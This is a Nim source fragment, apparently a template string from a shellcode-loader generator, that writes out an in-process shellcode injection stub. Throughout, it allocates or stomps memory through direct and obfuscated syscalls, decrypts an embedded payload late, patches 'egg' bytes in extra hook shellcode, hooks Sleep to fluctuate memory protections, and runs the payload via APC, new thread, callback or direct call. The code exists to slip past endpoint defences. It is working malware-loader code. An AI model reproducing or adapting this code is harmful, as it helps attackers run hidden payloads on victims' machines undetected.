let LocalInjectStub*  = """

    proc Wait(): void =
        when defined(wait):
            when defined(verbose):
                echo obf("Waiting for process to finish via WaitForSingleObject")
            when defined(DInvoke):
                discard MyWaitForSingleObject(-1, -1)
            else:
                WaitForSingleObject(-1, -1)
        else:
            discard

    proc pwndem[byte](friendlycode: openarray[byte]): void =

        when defined(Fluctuate):
            g_fluctuationData.shellcodeAddr = unsafeAddr friendlycode[0]
            g_fluctuationData.shellcodeSize = SIZE_T(friendlycode.len)
            # Will change the hardcoded key later on
            when defined(amd64):
                g_fluctuationData.encodeKey = 0x1337DE4D
            when defined(i386):
                g_fluctuationData.encodeKey = 0x1337
            g_fluctuationData.currentlyEncrypted = false
            g_fluctuationData.protect = PAGE_READWRITE
            g_fluctuate = FluctuateToRW
            if (hookSleep()):
                when defined(verbose):
                    echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
            else:
                when defined(verbose):
                    echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")

        var pHandle: HANDLE = -1
            
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID
            dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
        

        when defined(Hellsgate):
            if getSyscall(ntAllocTable):
                syscall = ntAllocTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
        
        var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
        
        when defined(RX):
            protectionValue = PAGE_READWRITE
        when defined(RWX):
            protectionValue = PAGE_EXECUTE_READWRITE
        
        when defined(remoteMapSection):
            when not defined(AllocateDripStyle):
                when defined(Hellsgate):
                    if getSyscall(ntCreateSectionTable):
                        syscall = ntCreateSectionTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateSection")
                
                # NtCreateSection Call
                var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
                var sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
                var hMapFile: HANDLE
                var protectionValueCreate: DWORD = PAGE_EXECUTE_READWRITE
                when defined(Syswhispers):
                    status = iuhqdihasduiahsdaksdhak(cast[PHANDLE](&buffer),SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,ULONG(protectionValue),SEC_COMMIT,0)
                else:
                    status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValueCreate,SEC_COMMIT,0)
                when defined(verbose):
                    echo obf("[*] NtCreateSection: "), toHex(status)
                    #buffer = cast[LPVOID](&hMapFile)
                    #echo obf("[*] Address: "), repr(buffer)
                    #echo "This is the prompt"
                    #var input = readLine(stdin)
                if (hMapFile == 0):
                    echo obf("[-] Failed to create file mapping")
                
                when defined(Hellsgate):
                    if getSyscall(ntMapViewOfSectionTable):
                        syscall = ntMapViewOfSectionTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtMapViewOfSection")
            
                var
                    lpMapAddress: PVOID = NULL
                    vSize: SIZE_T = sc_size
                
                when defined(Syswhispers):
                    uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
                else:
                    status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)

                if not NT_SUCCESS(status):
                    when defined(verbose):
                        echo obf("[-] NtMapViewOfSection failed")
                        echo obf("[*] NTSTATUS: "), toHex(status)
                else:
                    buffer = lpMapAddress
                    when defined(verbose):
                        echo obf("[+] NtMapViewOfSection success!")
                        echo obf("[*] Address: "), repr(buffer)
                        #echo "This is the prompt"
                        #var input = readLine(stdin)

        else:
            when not defined(AllocateDripStyle):
                when defined(stomb):
                    # Get Module Handle for stombDll, if not found Load it
                    module = GetModuleHandleA(stombDll)
                    if(module == 0):
                        module = LoadLibraryA(stombDll)
                        if(module == 0):
                            when defined(verbose):
                                echo obf("[-] Failed to load stomb DLL "), stombDll
                            quit(1)
                        else:
                            when defined(verbose):
                                echo obf("[+] Loaded stomb DLL "), stombDll, " ", repr(module)
                    else:
                        when defined(verbose):
                            echo obf("[+] stomb DLL already loaded "), stombDll," ", repr(module)

                    # get the address of the function stombFunc via GetProcAddress

                    buffer = GetProcAddress(cast[HMODULE](module), stombFunc)
                    when defined(verbose):
                        echo obf("[*] Found stomb function: "), repr(buffer), " ", stombFunc

                    var allocationSize: SIZE_T = cast[SIZE_T](dataSz) + 0x1000
                    
                    when defined(restore):
                        var textStart: LPVOID = cast[LPVOID](module) + 0x1000 # .text section always starts at this offset to the base address
                        var mbi: MEMORY_BASIC_INFORMATION
                        var sectionSize: SIZE_T = VirtualQueryEx(tProcess, textStart, addr mbi, sizeof(mbi))
                        when defined(verbose):
                            echo obf("[*] VirtualQueryEx result: "), sectionSize
                            echo obf("[*] Section size: "), mbi.RegionSize
                        
                        var originalRXSection: seq[byte] = newSeq[byte](mbi.RegionSize)
                        var numberOfBytesRead: SIZE_T

                        when defined(Hellsgate):
                            if getSyscall(ntReadTable):
                                syscall = ntReadTable.wSysCall
                            else:
                                when defined(verbose):
                                    echo obf("[-] Failed to find opcode for NtReadVirtualMemory")

                        status = NtReadVirtualMemory(tProcess, textStart, unsafeAddr originalRXSection[0], mbi.RegionSize, addr numberOfBytesRead)
                        
                        when defined(verbose):
                            if (status == 0):
                                echo obf("[+] ReadProcessMemory success!")
                            else:
                                echo obf("[-] Failed to read the original RX section")
                                quit(1)

                    when defined(Hellsgate):
                        if getSyscall(ntProtectTable):
                            syscall = ntProtectTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                    var protectAddress: LPVOID = buffer
                    var oProtect: DWORD
                    status = NtProtectVirtualMemory(-1, addr protectAddress, addr allocationSize, PAGE_READWRITE, addr oProtect)
                    when defined(verbose):
                        if (status == 0):
                            echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
                        else:
                            echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectAddress)
                            quit(1)
                        echo "[*] Buffer address: ", repr(buffer)

                else:
                    when defined(SysWhispers):
                        status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
                    else:
                        status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)

                    if not NT_SUCCESS(status):
                        when defined(verbose):
                            echo obf("[-] Failed to allocate memory.")
                            quit(1)
                    else:
                        when defined(verbose):
                            when defined(RX):
                                echo obf("[+] Allocated a page of memory with PAGE_READWRITE permissions")
                            else:
                                echo obf("[+] Allocated a page of memory with PAGE_EXECUTE_READWRITE permissions")

        when defined(AllocateDripStyle):
            buffer = DripAllocate(HANDLE(-1), cast[SIZE_T](friendlycode.len), friendlycode)
            if buffer == nil:
                when defined(verbose):
                    echo obf("[-] DripAllocation Failed")
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] DripAllocation Success!")

                
        when not defined(AllocateDripStyle):
            when defined(verbose):
                echo obf("[*] Writing shellcode to address: "), toHex(cast[HANDLE](buffer)), "\r\n"
            moveMemory(buffer, unsafeAddr friendlycode, friendlycode.len)
            # clean memory from friendlycode
            when defined(verbose):
                echo obf("[*] Cleaning memory")
            var clean: seq[byte] = newSeq[byte](friendlycode.len)
            moveMemory(unsafeAddr friendlycode[0], unsafeAddr clean[0], friendlycode.len)
            when defined(verbose):
                echo obf("[+] Memory cleaned")
            #[
            var bytesWritten: SIZE_T
            when defined(Hellsgate):
                var 
                    ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
                    ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
        
                if getSyscall(ntWriteTable):

                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                
            when defined(SysWhispers):
                status = oqiazasusjk(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
            else:       
                status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
                    echo obf("[-] NTSTATUS: "), toHex(status)
                    quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
            ]#
        when defined(JmpEntry):
            var newEntry: LPVOID
            newEntry = prepEntry(-1, buffer, jmpMod, jmpFunc)
            when defined(verbose):
                echo obf("[*] New Entry Point: "), toHex(cast[HANDLE](newEntry)), "\r\n"

        when not defined(AllocateDripStyle):
            when defined(RX): # we need to decrypt earlier, because we cannot without WRITE perms
                when defined(remoteMapSection):

                    when defined(Hellsgate):
                        if getSyscall(ntMapViewOfSectionTable):
                            syscall = ntMapViewOfSectionTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtMapViewOfSection")
                    var
                        lpMapAddress2: PVOID = NULL
                        vSize2: SIZE_T = sc_size
                    when defined(Syswhispers):
                        uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress2,0,0,NULL,&vSize2,2,0,PAGE_EXECUTE_READ)
                    else:
                        status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress2,0,0,NULL,&vSize2,2,0,PAGE_EXECUTE_READ)

                    if not NT_SUCCESS(status):
                        when defined(verbose):
                            echo obf("[-] NtMapViewOfSection failed")
                            echo obf("[*] NTSTATUS: "), toHex(status)
                    else:
                        when defined(verbose):
                            echo obf("[+] NtMapViewOfSection success!")
                            echo obf("[*] Address: "), repr(lpMapAddress2)
                            #echo "This is the prompt"
                            #var input = readLine(stdin)
        
                    when defined(sleepinbetween):
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                    
                    # decrypt the first mapped RW section page
                    ptrEncText = cast[ptr byte](buffer)
                    ptrDecText = cast[ptr byte](buffer)
                    decryptLate()
                    
                    # Set the buffer address to our newly mapped RX page.
                    buffer = lpMapAddress2
                else:
                    when defined(sleepinbetween):
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                    
                    ptrEncText = cast[ptr byte](buffer)
                    ptrDecText = cast[ptr byte](buffer)
                    decryptLate()
                    when not defined(carokann):
                        when defined(Hellsgate):
                            if getSyscall(ntProtectTable):
                                syscall = ntProtectTable.wSysCall
                            else:
                                when defined(verbose):
                                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                        var protectionAddress: LPVOID = buffer
                        when defined(syswhispers):
                            status = uashdiasdj(pHandle, &protectionAddress, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
                        else:
                            status = NtProtectVirtualMemory(pHandle, &protectionAddress, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
                        when defined(verbose):
                            echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
                            if (status == 0):
                                echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
                        if (status != 0):
                            when defined(verbose):
                                echo obf("[-] Failed to change permissions to PAGE_EXECUTE_READ")
                            quit(1)
        
        
        when defined(remoteMapSection):
            when defined(AllocateDripStyle):
                # we can now sleep && decrypt
                when defined(sleepinbetween):
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                when defined(verbose):
                    echo obf("[*] Decrypting the shellcode at address: "), toHex(cast[HANDLE](decryptbuffer)), "\r\n"
                #echo "This is the prompt"
                #var input = readLine(stdin)
                ptrEncText = cast[ptr byte](decryptbuffer)
                ptrDecText = cast[ptr byte](decryptbuffer)
                decryptLate()
                #echo "This is the prompt"
                #input = readLine(stdin)

        when defined(carokann):
            var protectedAddress: LPVOID = buffer
            var oldProtect: DWORD
            when defined(JmpEntry):
                var tempdsAddress = buffer
                buffer = newEntry

            const hookShellcode = slurp"decryptprotect.bin.tmp"

            var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)

            var hook_sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)

            var rPtr2: LPVOID

            when defined(verbose):
                echo  obf("[*] Allocating memory for our custom shellcode, which will decrypt and re-protect")
            

            when defined(stomb):

                # Get Module Handle for stombDll, if not found Load it
                module = GetModuleHandleA(stombDll)
                if(module == 0):
                    module = LoadLibraryA(stombDll)
                    if(module == 0):
                        when defined(verbose):
                            echo obf("[-] Failed to load stomb DLL "), stombDll
                        quit(1)
                    else:
                        when defined(verbose):
                            echo obf("[+] Loaded stomb DLL "), stombDll, " ", repr(module)
                else:
                    when defined(verbose):
                        echo obf("[+] stomb DLL already loaded "), stombDll," ", repr(module)

                # get the address of the function stombFunc2 via GetProcAddress

                rPtr2 = GetProcAddress(module, stombFunc2)
                when defined(verbose):
                    echo obf("[*] Found stomb function: "), repr(rPtr2)
                
                protectedAddress = rPtr2
                # as the function won't start at the section start, the protectedAddress will have an
                # offset to the address where we write the shellcode later on. This could lead to a problem,
                # if the shellcode is too big and the function is not at the end of the section. 
                # So we need to calculate the difference between the section start and the function start and may need to protect one more section
                # Or we just allocate one more 4kB page so make sure the offset is no problem
                var allocateSize: SIZE_T = cast[SIZE_T](hook_sc_size) + 0x1000
                
                when defined(Hellsgate):
                    if getSyscall(ntProtectTable):
                        syscall = ntProtectTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

                status = NtProtectVirtualMemory(-1, addr protectedAddress, addr allocateSize, PAGE_READWRITE, addr oldProtect)
                when defined(verbose):
                    if (status == 0):
                        echo obf("[+] NtProtectVirtualMemory success! "), repr(protectedAddress)
                    else:
                        echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectedAddress)
                        quit(1)

            else:
                when defined(Hellsgate):
                    if getSyscall(ntAllocTable):
                        syscall = ntAllocTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

                status = NtAllocateVirtualMemory(
                    -1,
                    addr rPtr2,
                    0,
                    addr hook_sc_size,
                    MEM_COMMIT or MEM_RESERVE,
                    PAGE_READWRITE)
                when defined(verbose):
                    if (status == 0):
                        echo obf("[+] NtAllocateVirtualMemory for Caro-Kann shellcode success "), repr(rPtr2)
                    else:
                        echo obf("[-] NtAllocateVirtualMemory for Caro-Kann shellcode failed "), repr(rPtr2)
                        quit(1)

            # The shellcode contains two eggs, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88 and 0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x41, 0xFF, 0xE2. Now we want to replace the first egg with the value of
            # the newly allocated memory address rptr, and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address

            var eggIndex = 0

            when defined(verbose):
                echo obf("-------------------------------------------------------------")
                echo obf("[*] Looking for the egg, which will be filled with the first shellcodes memory address")

            for i in 0 ..< hookShellcodeBytes.len:
                if (hookShellcodeBytes[i] == 0x88) and (hookShellcodeBytes[i+1] == 0x88) and (hookShellcodeBytes[i+2] == 0x88) and (hookShellcodeBytes[i+3] == 0x88) and (hookShellcodeBytes[i+4] == 0x88) and (hookShellcodeBytes[i+5] == 0x88):
                    when defined(verbose):
                        echo obf("[*] Found egg at index: "), i
                    eggIndex = i
                    break

            when defined(verbose):
                echo obf("[*] Writing allocated memory address into egg")

            copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr buffer, 8)

            when defined(verbose):
                echo obf("[*] Done.")

            # and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address


            when defined(verbose):
                echo obf("-------------------------------------------------------------")
                echo obf("[*] Looking for the second egg, which will be filled the same address but to jump there at the end")

            eggIndex = 0

            for i in 0 ..< hookShellcodeBytes.len:
                if (hookShellcodeBytes[i] == 0x49) and (hookShellcodeBytes[i+1] == 0xBA) and (hookShellcodeBytes[i+2] == 0x00) and (hookShellcodeBytes[i+3] == 0x00) and (hookShellcodeBytes[i+4] == 0x00) and (hookShellcodeBytes[i+5] == 0x00) and (hookShellcodeBytes[i+6] == 0x00) and (hookShellcodeBytes[i+7] == 0x00) and (hookShellcodeBytes[i+8] == 0x00) and (hookShellcodeBytes[i+9] == 0x00) and (hookShellcodeBytes[i+10] == 0x41) and (hookShellcodeBytes[i+11] == 0xFF) and (hookShellcodeBytes[i+12] == 0xE2):
                    when defined(verbose):
                        echo obf("[*] Found egg at index: "), i
                    # our 0x00 bytes start at position three, so we need to add three to the index
                    eggIndex = i + 2
                    break

            when defined(verbose):
                echo obf("[*] Writing memory address into the jump at the end")

            copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr buffer, 8)

            
            when defined(stomb):
                # We need to find and overwrite the egg 0x9999999999999999 with the address of the protectAddress, so that our shellcode knows where to re-protect
                eggIndex = 0
                when defined(verbose):
                    echo obf("-------------------------------------------------------------")
                    echo obf("[*] Looking for the fifth egg, which will be filled with the address of the memory address to re-protect")
                
                for i in 0 ..< hookShellcodeBytes.len:
                    if (hookShellcodeBytes[i] == 0x99) and (hookShellcodeBytes[i+1] == 0x99) and (hookShellcodeBytes[i+2] == 0x99) and (hookShellcodeBytes[i+3] == 0x99) and (hookShellcodeBytes[i+4] == 0x99) and (hookShellcodeBytes[i+5] == 0x99) and (hookShellcodeBytes[i+6] == 0x99) and (hookShellcodeBytes[i+7] == 0x99):
                        when defined(verbose):
                            echo obf("[*] Found egg at index: "), i
                        eggIndex = i
                        break

                when defined(verbose):
                    echo obf("[*] Writing memory address into the egg "), repr(protectedAddress)
                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr protectedAddress, 8)

            # Finally write the decryptprotect.bin shellcode into the remote process
            
            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            moveMemory(rPtr2, unsafeAddr hookShellcodeBytes[0], int(hookShellcodeBytes.len))             
            #[
            status = NtWriteVirtualMemory(-1, rPtr2, unsafeAddr hookShellcodeBytes[0], hook_sc_size, addr bytesWritten)
            
            if (status == 0):
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory for Caro-Kann shellcode success! "), repr(rPtr2)
                    echo obf("    \\-- bytes written: "), bytesWritten
                    echo obf("")
            else:
                when defined(verbose):
                    echo obf("[-] NtWriteVirtualMemory for Caro-Kann shellcode failed "), repr(rPtr2) ," ",  toHex(status)
                quit(1)
            ]#
            # Setting permissions to RX via VirtualProtectEx

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

            #var oldProtect: DWORD
            protectedAddress = rPtr2
            status = NtProtectVirtualMemory(-1, addr protectedAddress, addr hook_sc_size, PAGE_EXECUTE_READ, addr oldProtect)

            if (status == 0):
                when defined(verbose):
                    echo obf("[+] NtProtectVirtualMemory for Caro-Kann shellcode success! "), repr(protectedAddress)
                    echo obf("    \\-- old protection: "), oldProtect
                    echo obf("")
            else:
                when defined(verbose):
                    echo obf("[-] NtProtectVirtualMemory for Caro-Kann shellcode failed!")
                quit(1)
            
            # as the execute primitive should now execute our custom shellcode, we need to set buffer to the address of the shellcode. 
            # It will automatically jump to the regular shellcode after sleep, decryption and re-protect.
            buffer = rPtr2
            when defined(verbose):
                echo "[*] New Entry address for execute primitive: ", repr(buffer)  

        when defined(threadless):
            # check if the threadlessDll DLL is already loaded in the current process via GetModuleHandle
            var hModule: HMODULE = GetModuleHandleA(threadlessDll)
            if (hModule == 0):
                # if not, load it via LoadLibraryA
                hModule = LoadLibraryA(threadlessDll)
                if (hModule == 0):
                    when defined(verbose):
                        echo obf("[-] Failed to load threadless DLL")
                    quit(1)
                else:
                    when defined(verbose):
                        echo obf("[+] Loaded threadless DLL")
            else:
                when defined(verbose):
                    echo obf("[+] Threadless DLL already loaded")
            
            # get the address of threadlessFunction via GetProcAddress
            var threadlessFunctionAddr: LPVOID = GetProcAddress(hModule, threadlessFunction)
            if (threadlessFunctionAddr == nil):
                when defined(verbose):
                    echo obf("[-] Failed to get address of "), threadlessFunction
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] Got address of "), threadlessFunction
            
            # Call threadlessThread with current process, shellcode address and targetFunction address
            var threadlessSuccess: bool = threadlessThread(-1, buffer, threadlessFunctionAddr)
            if (threadlessSuccess == false):
                when defined(verbose):
                    echo obf("[-] Failed to create threadless thread")
                quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] Created threadless thread")
            
            # fake type definition for ThreadlessFunc to call the function for triggering the threadless thread
            type ThreadlessFunc = proc (hProcess: HANDLE, lpBaseAddress: LPVOID, lpStartAddress: LPVOID): bool {.stdcall.}
            var ThreadlessFuncPtr: ThreadlessFunc = cast[ThreadlessFunc](threadlessFunctionAddr)
            when defined(verbose):
                echo obf("[*] Calling threadlessFunction")
            var threadlessFuncSuccess: bool = ThreadlessFuncPtr(-1, nil, nil)

        when defined(QueueAPC):
            var tHandle: HANDLE = -2
            when defined(Hellsgate):
                if getSyscall(ntQueueApcThreadTable):
                    syscall = ntQueueApcThreadTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtQueueApcThread")
            
            when defined(JmpEntry):
                buffer = newEntry

            let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](buffer)
            status = NtQueueApcThread(tHandle, pfnAPC, buffer, nil, nil)
            when defined(verbose):
                echo obf("[*] NtQueueApcThread: "), toHex(status)
            
            when defined(Hellsgate):
                if getSyscall(ntTestAlertTable):
                    syscall = ntTestAlertTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtTestAlert")
            
            status = NtTestAlert()
            when defined(verbose):
                echo obf("[*] NtTestAlert: "), toHex(status)
            
            when defined(JmpEntry):
                Sleep(1000)
                if(restoreBytes(-1, buffer)):
                    when defined(verbose):
                        echo obf("[*] Restored bytes!")
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to restore bytes!")

            return


        when defined(LocalCreateThread):
            var tHandle: HANDLE
            when defined(JmpEntry):
                buffer = newEntry
            when not defined(AllocateDripStyle):
                when not defined(RX):
                    when defined(sleepinbetween):
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                    ptrEncText = cast[ptr byte](buffer)
                    ptrDecText = cast[ptr byte](buffer)
                    decryptLate()

            when defined(SysWhispers):
                status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
                NtWaitForSingleObject(tHandle, 0, nil)
                when defined(JmpEntry):
                    Sleep(1000)
                    if(restoreBytes(-1, buffer)):
                        when defined(verbose):
                            echo obf("[*] Restored bytes!")
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to restore bytes!")
                Wait()
                status = zuatzuastdiasyy(tHandle)
                status = zuatzuastdiasyy(pHandle)
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
            else:    
                when defined(Hellsgate):
                    if getSyscall(ntCreateTable):
                        syscall = ntCreateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateThreadEx")
                status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                nil, 
                -1,
                buffer, 
                nil, FALSE, 0, 0, 0, nil)
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
                when defined(JmpEntry):
                    Sleep(1000)
                    if(restoreBytes(-1, buffer)):
                        when defined(verbose):
                            echo obf("[*] Restored bytes!")
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to restore bytes!")
                
                # Somehow not working
                #var TimeOut: LARGE_INTEGER = cast[LARGE_INTEGER](-1)
                #NtWaitForSingleObject(-1, 0, &TimeOut)
                Wait()
            when defined(Hellsgate):
                when defined(Hellsgate):
                    if getSyscall(ntCloseTable):
                        syscall = ntCloseTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtClose")
            status = NtClose(tHandle)
            status = NtClose(pHandle)
            return
            
        when defined(Callback):
            when defined(JmpEntry):
                buffer = newEntry
            when defined(AllocateDripStyle):
                when not defined(RX):
                    when defined(sleepinbetween):
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                    ptrEncText = cast[ptr byte](buffer)
                    ptrDecText = cast[ptr byte](buffer)
                    decryptLate()
            discard EnumCalendarInfoA(cast[CALINFO_ENUMPROCA](buffer),1,1,1)
            when defined(JmpEntry):
                Sleep(1000)
                if(restoreBytes(-1, buffer)):
                    when defined(verbose):
                        echo obf("[*] Restored bytes!")
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to restore bytes!")
            Wait()
        else:
            when defined(JmpEntry):
                buffer = newEntry
            when not defined(AllocateDripStyle):
                when not defined(RX):
                    when defined(sleepinbetween):
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                    ptrEncText = cast[ptr byte](buffer)
                    ptrDecText = cast[ptr byte](buffer)
                    decryptlate()
            #write(stdout, "This is the prompt -> ")
            #var input = readLine(stdin)
            when defined(verbose):
                echo "[*] Entry address for execute primitive: ", repr(buffer) 
            let f = cast[proc(){.nimcall.}](buffer)
            f()
            when defined(JmpEntry):
                Sleep(1000)
                if(restoreBytes(-1, buffer)):
                    when defined(verbose):
                        echo obf("[*] Restored bytes!")
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to restore bytes!")
            Wait()

    pwndem(enctext)
    return 0

when not defined(proxy):
    when not defined(service):
        when not defined(cloned):
            discard main(nil)

when defined(defaultMain):
    when not defined(service):
        when not defined(cloned):
            discard main(nil)
"""
